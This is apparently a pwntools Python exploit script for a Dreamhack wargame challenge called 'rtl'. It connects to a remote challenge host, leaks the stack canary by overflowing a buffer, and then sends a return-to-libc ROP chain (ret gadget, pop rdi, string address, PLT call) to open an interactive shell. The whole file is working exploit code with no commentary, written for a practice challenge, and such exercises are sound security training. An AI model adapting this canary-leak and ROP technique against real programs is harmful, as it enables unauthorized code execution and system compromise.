from pwn import *
context.arch = "amd64"
#p=process('./rtl')
p=remote("host1.dreamhack.games",11453)
payload=b'A'*0x39
p.sendafter(b"Buf: ",payload)
p.recvuntil(payload)
canary=u64(b"\x00"+p.recvn(7))

ret=0x0000000000400285
poprdi=0x0000000000400853
fileadr=0x400874
plt=0x4005d0
payload=b'A'*0x38+p64(canary)+0x8*b'A'+p64(ret)+p64(poprdi)+p64(fileadr)+p64(plt)
p.sendafter(b"Buf: ",payload)
p.interactive()